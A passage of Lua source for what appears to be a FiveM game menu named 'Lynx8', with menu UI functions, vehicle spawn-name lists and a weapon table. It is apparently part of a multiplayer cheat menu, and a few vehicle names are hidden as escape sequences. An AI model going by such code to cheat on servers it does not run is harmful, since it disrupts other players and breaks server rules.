    j[G].titleFont = 1
    j[G].titleColor = {r = 255, g = 255, b = 255, a = 255}
    Citizen.CreateThread(
        function()
            while true do
                Citizen.Wait(0)
                local a5 = d(1.0)
                j[G].titleBackgroundColor = {r = a5.r, g = a5.g, b = a5.b, a = 105}
                j[G].menuFocusBackgroundColor = {r = 255, g = 255, b = 255, a = 100}
            end
        end
    )
    j[G].titleBackgroundSprite = nil
    j[G].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
    j[G].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}
    j[G].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
    j[G].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 100}
    j[G].subTitleBackgroundColor = {
        r = j[G].menuBackgroundColor.r,
        g = j[G].menuBackgroundColor.g,
        b = j[G].menuBackgroundColor.b,
        a = 255
    }
    j[G].buttonPressedSound = {
        name = '~h~~r~> ~s~SELECT',
        set = 'HUD_FRONTEND_DEFAULT_SOUNDSET'
    }
    D(tostring(G) .. ' menu created')
end

function Lynx8.CreateSubMenu(G, a6, a7)
    if j[a6] then
        Lynx8.CreateMenu(G, j[a6].title)
        if a7 then
            F(G, 'subTitle', a7)
        else
            F(G, 'subTitle', j[a6].subTitle)
        end
        F(G, 'previousMenu', a6)
        F(G, 'x', j[a6].x)
        F(G, 'y', j[a6].y)
        F(G, 'maxOptionCount', j[a6].maxOptionCount)
        F(G, 'titleFont', j[a6].titleFont)
        F(G, 'titleColor', j[a6].titleColor)
        F(G, 'titleBackgroundColor', j[a6].titleBackgroundColor)
        F(G, 'titleBackgroundSprite', j[a6].titleBackgroundSprite)
        F(G, 'menuTextColor', j[a6].menuTextColor)
        F(G, 'menuSubTextColor', j[a6].menuSubTextColor)
        F(G, 'menuFocusTextColor', j[a6].menuFocusTextColor)
        F(G, 'menuFocusBackgroundColor', j[a6].menuFocusBackgroundColor)
        F(G, 'menuBackgroundColor', j[a6].menuBackgroundColor)
        F(G, 'subTitleBackgroundColor', j[a6].subTitleBackgroundColor)
    else
        D('Failed to create ' .. tostring(G) .. ' submenu: ' .. tostring(a6) .. " parent menu doesn't exist")
    end
end

function Lynx8.CurrentMenu()
    return n
end

function Lynx8.OpenMenu(G)
    if G and j[G] then
        PlaySoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
        J(G, true)
        if j[G].titleBackgroundSprite then
            RequestStreamedTextureDict(j[G].titleBackgroundSprite.dict, false)
            while not HasStreamedTextureDictLoaded(j[G].titleBackgroundSprite.dict) do
                Citizen.Wait(0)
            end
        end
        D(tostring(G) .. ' menu opened')
    else
        D('Failed to open ' .. tostring(G) .. " menu: it doesn't exist")
    end
end

function Lynx8.IsMenuOpened(G)
    return I(G)
end

function Lynx8.IsAnyMenuOpened()
    for G, _ in pairs(j) do
        if I(G) then
            return true
        end
    end
    return false
end

function Lynx8.IsMenuAboutToBeClosed()
    if j[n] then
        return j[n].aboutToBeClosed
    else
        return false
    end
end

function Lynx8.CloseMenu()
    if j[n] then
        if j[n].aboutToBeClosed then
            j[n].aboutToBeClosed = false
            J(n, false)
            D(tostring(n) .. ' menu closed')
            PlaySoundFrontend(-1, 'QUIT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            l = 0
            n = nil
            m = nil
        else
            j[n].aboutToBeClosed = true
            D(tostring(n) .. ' menu about to be closed')
        end
    end
end

function Lynx8.Button(E, Z)
    local a8 = E
    if Z then
        a8 = '{ ' .. tostring(a8) .. ', ' .. tostring(Z) .. ' }'
    end
    if j[n] then
        l = l + 1
        local a9 = j[n].currentOption == l
        Y(E, Z)
        if a9 then
            if m == k.select then
                PlaySoundFrontend(-1, j[n].buttonPressedSound.name, j[n].buttonPressedSound.set, true)
                D(a8 .. ' button pressed')
                return true
            elseif m == k.left or m == k.right then
                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            end
        end
        return false
    else
        D('Failed to create ' .. a8 .. ' button: ' .. tostring(n) .. " menu doesn't exist")
        return false
    end
end

function Lynx8.MenuButton(E, G)
    if j[G] then
        if Lynx8.Button(E) then
            J(n, false)
            J(G, true, true)
            return true
        end
    else
        D('Failed to create ' .. tostring(E) .. ' menu button: ' .. tostring(G) .. " submenu doesn't exist")
    end
    return false
end

function Lynx8.CheckBox(E, bool, aa)
    local ab = '~r~~h~OFF'
    if bool then
        ab = '~g~~h~ON'
    end
    if Lynx8.Button(E, ab) then
        bool = not bool
        D(tostring(E) .. ' checkbox changed to ' .. tostring(bool))
        aa(bool)
        return true
    end
    return false
end

function Lynx8.ComboBox(E, ac, ad, ae, aa)
    local af = #ac
    local ag = ac[ad]
    local a9 = j[n].currentOption == l + 1
    if af > 1 and a9 then
        ag = 'F ' .. tostring(ag) .. ' F'
    end
    if Lynx8.Button(E, ag) then
        ae = ad
        aa(ad, ae)
        return true
    elseif a9 then
        if m == k.left then
            if ad > 1 then
                ad = ad - 1
            else
                ad = af
            end
        elseif m == k.right then
            if ad < af then
                ad = ad + 1
            else
                ad = 1
            end
        end
    else
        ad = ae
    end
    aa(ad, ae)
    return false
end

function Lynx8.Display()
    if I(n) then
        if j[n].aboutToBeClosed then
            Lynx8.CloseMenu()
        else
            ClearAllHelpMessages()
            V()
            W()
            m = nil
            if IsDisabledControlJustPressed(0, k.down) then
                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                if j[n].currentOption < l then
                    j[n].currentOption = j[n].currentOption + 1
                else
                    j[n].currentOption = 1
                end
            elseif IsDisabledControlJustPressed(0, k.up) then
                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                if j[n].currentOption > 1 then
                    j[n].currentOption = j[n].currentOption - 1
                else
                    j[n].currentOption = l
                end
            elseif IsDisabledControlJustPressed(0, k.left) then
                m = k.left
            elseif IsDisabledControlJustPressed(0, k.right) then
                m = k.right
            elseif IsDisabledControlJustPressed(0, k.select) then
                m = k.select
            elseif IsDisabledControlJustPressed(0, k.back) then
                if j[j[n].previousMenu] then
                    PlaySoundFrontend(-1, 'BACK', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    J(j[n].previousMenu, true)
                else
                    Lynx8.CloseMenu()
                end
            end
            l = 0
        end
    end
end

function Lynx8.SetMenuWidth(G, U)
    F(G, 'width', U)
end

function Lynx8.SetMenuX(G, x)
    F(G, 'x', x)
end

function Lynx8.SetMenuY(G, y)
    F(G, 'y', y)
end

function Lynx8.SetMenuMaxOptionCountOnScreen(G, count)
    F(G, 'maxOptionCount', count)
end

function Lynx8.SetTitleColor(G, r, g, b, a)
    F(G, 'titleColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or j[G].titleColor.a})
end

function Lynx8.SetTitleBackgroundColor(G, r, g, b, a)
    F(
        G,
        'titleBackgroundColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = a or j[G].titleBackgroundColor.a
        }
    )
end

function Lynx8.SetTitleBackgroundSprite(G, ah, ai)
    F(G, 'titleBackgroundSprite', {dict = ah, name = ai})
end

function Lynx8.SetSubTitle(G, E)
    F(G, 'subTitle', E)
end

function Lynx8.SetMenuBackgroundColor(G, r, g, b, a)
    F(
        G,
        'menuBackgroundColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = a or j[G].menuBackgroundColor.a
        }
    )
end

function Lynx8.SetMenuTextColor(G, r, g, b, a)
    F(G, 'menuTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or j[G].menuTextColor.a})
end

function Lynx8.SetMenuSubTextColor(G, r, g, b, a)
    F(G, 'menuSubTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or j[G].menuSubTextColor.a})
end

function Lynx8.SetMenuFocusColor(G, r, g, b, a)
    F(G, 'menuFocusColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or j[G].menuFocusColor.a})
end

function Lynx8.SetMenuButtonPressedSound(G, name, aj)
    F(G, 'buttonPressedSound', {['name'] = name, ['set'] = aj})
end

function KeyboardInput(ak, al, am)
    AddTextEntry('FMMC_KEY_TIP1', ak .. ':')
    DisplayOnscreenKeyboard(1, 'FMMC_KEY_TIP1', '', al, '', '', '', am)
    blockinput = true
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end
    if UpdateOnscreenKeyboard() ~= 2 then
        local f = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        blockinput = false
        return f
    else
        Citizen.Wait(500)
        blockinput = false
        return nil
    end
end
local function an()
    local ao = {}
    for i = 0, GetNumberOfPlayers() do
        if NetworkIsPlayerActive(i) then
            ao[#ao + 1] = i
        end
    end
    return ao
end

function DrawText3D(x, y, z, E, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(0.0, 0.20)
    SetTextColour(r, g, b, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    SetTextCentre(1)
    AddTextComponentString(E)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end

function math.round(ap, aq)
    return tonumber(string.format('%.' .. (aq or 0) .. 'f', ap))
end
local function d(e)
    local f = {}
    local h = GetGameTimer() / 1000
    f.r = math.floor(math.sin(h * e + 0) * 127 + 128)
    f.g = math.floor(math.sin(h * e + 2) * 127 + 128)
    f.b = math.floor(math.sin(h * e + 4) * 127 + 128)
    return f
end

function drawNotification(E)
    SetNotificationTextEntry('STRING')
    AddTextComponentString(E)
    DrawNotification(false, false)
end

function checkValidVehicleExtras()
    local ar = PlayerPedId()
    local as = GetVehiclePedIsIn(ar, false)
    local at = {}
    for i = 0, 50, 1 do
        if DoesExtraExist(as, i) then
            local au = '~h~Extra #' .. tostring(i)
            local E = 'OFF'
            if IsVehicleExtraTurnedOn(as, i) then
                E = 'ON'
            end
            local av = '~h~extra ' .. tostring(i)
            table.insert(
                at,
                {
                    menuName = realModName,
                    data = {['action'] = realSpawnName, ['state'] = E}
                }
            )
        end
    end
    return at
end

function DoesVehicleHaveExtras(veh)
    for i = 1, 30 do
        if DoesExtraExist(veh, i) then
            return true
        end
    end
    return false
end

function checkValidVehicleMods(aw)
    local ar = PlayerPedId()
    local as = GetVehiclePedIsIn(ar, false)
    local at = {}
    local ax = GetNumVehicleMods(as, aw)
    if aw == 48 and ax == 0 then
        local ax = GetVehicleLiveryCount(as)
        for i = 1, ax, 1 do
            local ay = i - 1
            local az = GetLiveryName(as, ay)
            local realModName = GetLabelText(az)
            local aA, realSpawnName = aw, ay
            at[i] = {
                menuName = realModName,
                data = {['modid'] = aA, ['realIndex'] = realSpawnName}
            }
        end
    end
    for i = 1, ax, 1 do
        local ay = i - 1
        local az = GetModTextLabel(as, aw, ay)
        local realModName = GetLabelText(az)
        local aA, realSpawnName = ax, ay
        at[i] = {
            menuName = realModName,
            data = {['modid'] = aA, ['realIndex'] = realSpawnName}
        }
    end
    if ax > 0 then
        local ay = -1
        local aA, realSpawnName = aw, ay
        table.insert(
            at,
            1,
            {
                menuName = 'Stock',
                data = {['modid'] = aA, ['realIndex'] = realSpawnName}
            }
        )
    end
    return at
end
local aB = {
    'Dinghy',
    'Dinghy2',
    'Dinghy3',
    'Dingh4',
    'Jetmax',
    'Marquis',
    'Seashark',
    'Seashark2',
    'Seashark3',
    'Speeder',
    'Speeder2',
    'Squalo',
    'Submersible',
    'Submersible2',
    'Suntrap',
    'Toro',
    'Toro2',
    'Tropic',
    'Tropic2',
    'Tug'
}
local aC = {
    'Benson',
    'Biff',
    'Cerberus',
    'Cerberus2',
    'Cerberus3',
    'Hauler',
    'Hauler2',
    'Mule',
    'Mule2',
    'Mule3',
    'Mule4',
    'Packer',
    'Phantom',
    'Phantom2',
    'Phantom3',
    'Pounder',
    'Pounder2',
    'Stockade',
    'Stockade3',
    'Terbyte'
}
local aD = {
    'Blista',
    'Blista2',
    'Blista3',
    'Brioso',
    'Dilettante',
    'Dilettante2',
    'Issi2',
    'Issi3',
    'issi4',
    'Iss5',
    'issi6',
    'Panto',
    'Prarire',
    'Rhapsody'
}
local aE = {
    'CogCabrio',
    'Exemplar',
    'F620',
    'Felon',
    'Felon2',
    'Jackal',
    'Oracle',
    'Oracle2',
    'Sentinel',
    'Sentinel2',
    'Windsor',
    'Windsor2',
    'Zion',
    'Zion2'
}
local aF = {
    'Bmx',
    'Cruiser',
    'Fixter',
    'Scorcher',
    'Tribike',
    'Tribike2',
    'tribike3'
}
local aG = {
    '\97\109\98\117\108\97\110\99\101',
    'FBI',
    'FBI2',
    'FireTruk',
    'PBus',
    '\112\111\108\105\99\101',
    'Police2',
    'Police3',
    'Police4',
    'PoliceOld1',
    'PoliceOld2',
    'PoliceT',
    'Policeb',
    'Polmav',
    'Pranger',
    'Predator',
    'Riot',
    'Riot2',
    'Sheriff',
    'Sheriff2'
}
local aH = {
    'Akula',
    'Annihilator',
    'Buzzard',
    'Buzzard2',
    'Cargobob',
    'Cargobob2',
    'Cargobob3',
    'Cargobob4',
    'Frogger',
    'Frogger2',
    'Havok',
    'Hunter',
    'Maverick',
    'Savage',
    'Seasparrow',
    'Skylift',
    'Supervolito',
    'Supervolito2',
    'Swift',
    'Swift2',
    'Valkyrie',
    'Valkyrie2',
    'Volatus'
}
local aI = {
    'Bulldozer',
    'Cutter',
    'Dump',
    'Flatbed',
    'Guardian',
    'Handler',
    'Mixer',
    'Mixer2',
    'Rubble',
    'Tiptruck',
    'Tiptruck2'
}
local aJ = {
    'APC',
    'Barracks',
    'Barracks2',
    'Barracks3',
    'Barrage',
    'Chernobog',
    'Crusader',
    'Halftrack',
    'Khanjali',
    'Rhino',
    'Scarab',
    'Scarab2',
    'Scarab3',
    'Thruster',
    'Trailersmall2'
}
local aK = {
    'Akuma',
    'Avarus',
    'Bagger',
    'Bati2',
    'Bati',
    'BF400',
    'Blazer4',
    'CarbonRS',
    'Chimera',
    'Cliffhanger',
    'Daemon',
    'Daemon2',
    'Defiler',
    'Deathbike',
    'Deathbike2',
    'Deathbike3',
    'Diablous',
    'Diablous2',
    'Double',
    'Enduro',
    'esskey',
    'Faggio2',
    'Faggio3',
    'Faggio',
    'Fcr2',
    'fcr',
    'gargoyle',
    'hakuchou2',
    'hakuchou',
    'hexer',
    'innovation',
    'Lectro',
    'Manchez',
    'Nemesis',
    'Nightblade',
    'Oppressor',
    'Oppressor2',
    'PCJ',
    'Ratbike',
    'Ruffian',
    'Sanchez2',
    'Sanchez',
    'Sanctus',
    'Shotaro',
    'Sovereign',
    'Thrust',
    'Vader',
    'Vindicator',
    'Vortex',
    'Wolfsbane',
    'zombiea',
    'zombieb'
}
local aL = {
    'Blade',
    'Buccaneer',
    'Buccaneer2',
    'Chino',
    'Chino2',
    'clique',
    'Deviant',
    'Dominator',
    'Dominator2',
    'Dominator3',
    'Dominator4',
    'Dominator5',
    'Dominator6',
    'Dukes',
    'Dukes2',
    'Ellie',
    'Faction',
    'faction2',
    'faction3',
    'Gauntlet',
    'Gauntlet2',
    'Hermes',
    'Hotknife',
    'Hustler',
    'Impaler',
    'Impaler2',
    'Impaler3',
    'Impaler4',
    'Imperator',
    'Imperator2',
    'Imperator3',
    'Lurcher',
    'Moonbeam',
    'Moonbeam2',
    'Nightshade',
    'Phoenix',
    'Picador',
    'RatLoader',
    'RatLoader2',
    'Ruiner',
    'Ruiner2',
    'Ruiner3',
    'SabreGT',
    'SabreGT2',
    'Sadler2',
    'Slamvan',
    'Slamvan2',
    'Slamvan3',
    'Slamvan4',
    'Slamvan5',
    'Slamvan6',
    'Stalion',
    'Stalion2',
    'Tampa',
    'Tampa3',
    'Tulip',
    'Vamos,',
    'Vigero',
    'Virgo',
    'Virgo2',
    'Virgo3',
    'Voodoo',
    'Voodoo2',
    'Yosemite'
}
local aM = {
    'BFinjection',
    'Bifta',
    'Blazer',
    'Blazer2',
    'Blazer3',
    'Blazer5',
    'Bohdi',
    'Brawler',
    'Bruiser',
    'Bruiser2',
    'Bruiser3',
    'Caracara',
    'DLoader',
    'Dune',
    'Dune2',
    'Dune3',
    'Dune4',
    'Dune5',
    'Insurgent',
    'Insurgent2',
    'Insurgent3',
    'Kalahari',
    'Kamacho',
    'LGuard',
    'Marshall',
    'Mesa',
    'Mesa2',
    'Mesa3',
    'Monster',
    'Monster4',
    'Monster5',
    'Nightshark',
    'RancherXL',
    'RancherXL2',
    'Rebel',
    'Rebel2',
    'RCBandito',
    'Riata',
    'Sandking',
    'Sandking2',
    'Technical',
    'Technical2',
    'Technical3',
    'TrophyTruck',
    'TrophyTruck2',
    'Freecrawler',
    'Menacer'
}
local aN = {
    'AlphaZ1',
    'Avenger',
    'Avenger2',
    'Besra',
    'Blimp',
    'blimp2',
    'Blimp3',
    'Bombushka',
    'Cargoplane',
    'Cuban800',
    'Dodo',
    'Duster',
    'Howard',
    'Hydra',
    'Jet',
    'Lazer',
    'Luxor',
    'Luxor2',
    'Mammatus',
    'Microlight',
    'Miljet',
    'Mogul',
    'Molotok',
    'Nimbus',
    'Nokota',
    'Pyro',
    'Rogue',
    'Seabreeze',
    'Shamal',
    'Starling',
    'Stunt',
    'Titan',
    'Tula',
    'Velum',
    'Velum2',
    'Vestra',
    'Volatol',
    'Striekforce'
}
local aO = {
    'BJXL',
    'Baller',
    'Baller2',
    'Baller3',
    'Baller4',
    'Baller5',
    'Baller6',
    'Cavalcade',
    'Cavalcade2',
    'Dubsta',
    'Dubsta2',
    'Dubsta3',
    'FQ2',
    'Granger',
    'Gresley',
    'Habanero',
    'Huntley',
    'Landstalker',
    'patriot',
    'Patriot2',
    'Radi',
    'Rocoto',
    'Seminole',
    'Serrano',
    'Toros',
    'XLS',
    'XLS2'
}
local aP = {
    'Asea',
    'Asea2',
    'Asterope',
    'Cog55',
    'Cogg552',
    'Cognoscenti',
    'Cognoscenti2',
    'emperor',
    'emperor2',
    'emperor3',
    'Fugitive',
    'Glendale',
    'ingot',
    'intruder',
    'limo2',
    'premier',
    'primo',
    'primo2',
    'regina',
    'romero',
    'stafford',
    'Stanier',
    'stratum',
    'stretch',
    'surge',
    'tailgater',
    'warrener',
    'Washington'
}
local aQ = {
    'Airbus',
    'Brickade',
    'Bus',
    'Coach',
    'Rallytruck',
    'Rentalbus',
    '\116\97\120\105',
    'Tourbus',
    'Trash',
    'Trash2',
    'WastIndr',
    'PBus2'
}
local aR = {
    'Alpha',
    'Banshee',
    'Banshee2',
    'BestiaGTS',
    'Buffalo',
    'Buffalo2',
    'Buffalo3',
    'Carbonizzare',
    'Comet2',
    'Comet3',
    'Comet4',
    'Comet5',
    'Coquette',
    'Deveste',
    'Elegy',
    'Elegy2',
    'Feltzer2',
    'Feltzer3',
    'FlashGT',
    'Furoregt',
    'Fusilade',
    'Futo',
    'GB200',
    'Hotring',
    'Infernus2',
    'Italigto',
    'Jester',
    'Jester2',
    'Khamelion',
    'Kurama',
    'Kurama2',
    'Lynx',
    'MAssacro',
    'MAssacro2',
    'neon',
    'Ninef',
    'ninfe2',
    'omnis',
    'Pariah',
    'Penumbra',
    'Raiden',
    'RapidGT',
    'RapidGT2',
    'Raptor',
    'Revolter',
    'Ruston',
    'Schafter2',
    'Schafter3',
    'Schafter4',
    'Schafter5',
    'Schafter6',
    'Schlagen',
    'Schwarzer',
    'Sentinel3',
    'Seven70',
    'Specter',
    'Specter2',
    'Streiter',
    'Sultan',
    'Surano',
    'Tampa2',
    'Tropos',
    'Verlierer2',
    'ZR380',
    'ZR3802',
    'ZR3803'
}
local aS = {
    'Ardent',
    'BType',
    'BType2',
    'BType3',
    'Casco',
    'Cheetah2',
    'Cheburek',
    'Coquette2',
    'Coquette3',
    'Deluxo',
    'Fagaloa',
    'Gt500',
    'JB700',
    'JEster3',
    'MAmba',
    'Manana',
    'Michelli',
    'Monroe',
    'Peyote',
    'Pigalle',
    'RapidGT3',
    'Retinue',
    'Savastra',
    'Stinger',
    'Stingergt',
    'Stromberg',
    'Swinger',
    'Torero',
    'Tornado',
    'Tornado2',
    'Tornado3',
    'Tornado4',
    'Tornado5',
    'Tornado6',
    'Viseris',
    'Z190',
    'ZType'
}
local aT = {
    'Adder',
    'Autarch',
    'Bullet',
    'Cheetah',
    'Cyclone',
    'EntityXF',
    'Entity2',
    'FMJ',
    'GP1',
    'Infernus',
    'LE7B',
    'Nero',
    'Nero2',
    'Osiris',
    'Penetrator',
    'PFister811',
    'Prototipo',
    'Reaper',
    'SC1',
    'Scramjet',
    'Sheava',
    'SultanRS',
    'Superd',
    'T20',
    'Taipan',
    'Tempesta',
    'Tezeract',
    'Turismo2',
    'Turismor',
    'Tyrant',
    'Tyrus',
    'Vacca',
    'Vagner',
    'Vigilante',
    'Visione',
    'Voltic',
    'Voltic2',
    'Zentorno',
    'Italigtb',
    'Italigtb2',
    'XA21'
}
local aU = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local aV = {
    'Freight',
    'Freightcar',
    'Freightcont1',
    'Freightcont2',
    'Freightgrain',
    'Freighttrailer',
    'TankerCar'
}
local aW = {
    'Airtug',
    'Caddy',
    'Caddy2',
    'Caddy3',
    'Docktug',
    'Forklift',
    'Mower',
    'Ripley',
    'Sadler',
    'Scrap',
    'TowTruck',
    'Towtruck2',
    'Tractor',
    'Tractor2',
    'Tractor3',
    'TrailerLArge2',
    'Utilitruck',
    'Utilitruck3',
    'Utilitruck2'
}
local aX = {
    'Bison',
    'Bison2',
    'Bison3',
    'BobcatXL',
    'Boxville',
    'Boxville2',
    'Boxville3',
    'Boxville4',
    'Boxville5',
    'Burrito',
    'Burrito2',
    'Burrito3',
    'Burrito4',
    'Burrito5',
    'Camper',
    'GBurrito',
    'GBurrito2',
    'Journey',
    'Minivan',
    'Minivan2',
    'Paradise',
    'pony',
    'Pony2',
    'Rumpo',
    'Rumpo2',
    'Rumpo3',
    'Speedo',
    'Speedo2',
    'Speedo4',
    'Surfer',
    'Surfer2',
    'Taco',
    'Youga',
    'youga2'
}
local aY = {
    'Boats',
    'Commercial',
    'Compacts',
    'Coupes',
    'Cycles',
    'Emergency',
    'Helictopers',
    'Industrial',
    'Military',
    'Motorcycles',
    'Muscle',
    'Off-Road',
    'Planes',
    'SUVs',
    'Sedans',
    'Service',
    'Sports',
    'Sports Classic',
    'Super',
    'Trailer',
    'Trains',
    'Utility',
    'Vans'
}
local aZ = {
    aB,
    aC,
    aD,
    aE,
    aF,
    aG,
    aH,
    aI,
    aJ,
    aK,
    aL,
    aM,
    aN,
    aO,
    aP,
    aQ,
    aR,
    aS,
    aT,
    aU,
    aV,
    aW,
    aX
}
local a_ = {
    'WEAPON_KNIFE',
    'WEAPON_KNUCKLE',
    'WEAPON_NIGHTSTICK',
    'WEAPON_HAMMER',
    'WEAPON_BAT',
    'WEAPON_GOLFCLUB',
    'WEAPON_CROWBAR',
    'WEAPON_BOTTLE',
    'WEAPON_DAGGER',
    'WEAPON_HATCHET',
    'WEAPON_MACHETE',
    'WEAPON_FLASHLIGHT',
    'WEAPON_SWITCHBLADE',
    'WEAPON_PISTOL',
    'WEAPON_PISTOL_MK2',
    'WEAPON_COMBATPISTOL',
    'WEAPON_APPISTOL',
    'WEAPON_PISTOL50',
    'WEAPON_SNSPISTOL',
    'WEAPON_HEAVYPISTOL',
    'WEAPON_VINTAGEPISTOL',
    'WEAPON_STUNGUN',
    'WEAPON_FLAREGUN',
    'WEAPON_MARKSMANPISTOL',
    'WEAPON_REVOLVER',
    'WEAPON_MICROSMG',
    'WEAPON_SMG',
    'WEAPON_SMG_MK2',
    'WEAPON_ASSAULTSMG',
    'WEAPON_MG',
    'WEAPON_COMBATMG',
    'WEAPON_COMBATMG_MK2',
    'WEAPON_COMBATPDW',
    'WEAPON_GUSENBERG',
    'WEAPON_MACHINEPISTOL',
    'WEAPON_ASSAULTRIFLE',
    'WEAPON_ASSAULTRIFLE_MK2',
    'WEAPON_CARBINERIFLE',
    'WEAPON_CARBINERIFLE_MK2',
    'WEAPON_ADVANCEDRIFLE',
    'WEAPON_SPECIALCARBINE',
    'WEAPON_BULLPUPRIFLE',
    'WEAPON_COMPACTRIFLE',
    'WEAPON_PUMPSHOTGUN',
    'WEAPON_SAWNOFFSHOTGUN',
    'WEAPON_BULLPUPSHOTGUN',
    'WEAPON_ASSAULTSHOTGUN',
    'WEAPON_MUSKET',
    'WEAPON_HEAVYSHOTGUN',
    'WEAPON_DBSHOTGUN',
    'WEAPON_SNIPERRIFLE',
    'WEAPON_HEAVYSNIPER',
    'WEAPON_HEAVYSNIPER_MK2',
    'WEAPON_MARKSMANRIFLE',
    'WEAPON_GRENADELAUNCHER',
    'WEAPON_GRENADELAUNCHER_SMOKE',
    'WEAPON_RPG',
    'WEAPON_STINGER',
    'WEAPON_FIREWORK',
    'WEAPON_HOMINGLAUNCHER',
    'WEAPON_GRENADE',
    'WEAPON_STICKYBOMB',
    'WEAPON_PROXMINE',
    'WEAPON_BZGAS',
    'WEAPON_SMOKEGRENADE',
    'WEAPON_MOLOTOV',
    'WEAPON_FIREEXTINGUISHER',
    'WEAPON_PETROLCAN',
    'WEAPON_SNOWBALL',
    'WEAPON_FLARE',
    'WEAPON_BALL'
}
local b0 = {
    Melee = {
        BaseballBat = {
            id = 'weapon_bat',
            name = '~h~~r~> ~s~Baseball Bat',
            bInfAmmo = false,
            mods = {}
        },
        BrokenBottle = {
            id = 'weapon_bottle',
            name = '~h~~r~> ~s~Broken Bottle',
            bInfAmmo = false,
            mods = {}
        },
        Crowbar = {
            id = 'weapon_Crowbar',
            name = '~h~~r~> ~s~Crowbar',
            bInfAmmo = false,
            mods = {}
        },
        Flashlight = {
            id = 'weapon_flashlight',
            name = '~h~~r~> ~s~Flashlight',
            bInfAmmo = false,
            mods = {}
        },
        GolfClub = {
            id = 'weapon_golfclub',
            name = '~h~~r~> ~s~Golf Club',
            bInfAmmo = false,
            mods = {}
        },
        BrassKnuckles = {
            id = 'weapon_knuckle',
            name = '~h~~r~> ~s~Brass Knuckles',
            bInfAmmo = false,
            mods = {}
        },
        Knife = {
            id = 'weapon_knife',
            name = '~h~~r~> ~s~Knife',
            bInfAmmo = false,
            mods = {}
        },
        Machete = {
            id = 'weapon_machete',
            name = '~h~~r~> ~s~Machete',
            bInfAmmo = false,
            mods = {}
        },
        Switchblade = {
            id = 'weapon_switchblade',
            name = '~h~~r~> ~s~Switchblade',
            bInfAmmo = false,
            mods = {}
        },
        Nightstick = {
            id = 'weapon_nightstick',
            name = '~h~~r~> ~s~Nightstick',
            bInfAmmo = false,
            mods = {}
        },
        BattleAxe = {
            id = 'weapon_battleaxe',
            name = '~h~~r~> ~s~Battle Axe',
            bInfAmmo = false,
            mods = {}
        }
    },
    Handguns = {
        Pistol = {
            id = 'weapon_pistol',
            name = '~h~~r~> ~s~Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_PISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_PISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        PistolMK2 = {
            id = 'weapon_pistol_mk2',
            name = '~h~~r~> ~s~Pistol MK 2',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Mounted Scope',
                        id = 'COMPONENT_AT_PI_RAIL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Compensator',
                        id = 'COMPONENT_AT_PI_COMP'
                    },
                    {
                        name = '~h~~r~> ~s~Suppessor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        CombatPistol = {
            id = 'weapon_combatpistol',
            name = '~h~Combat Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
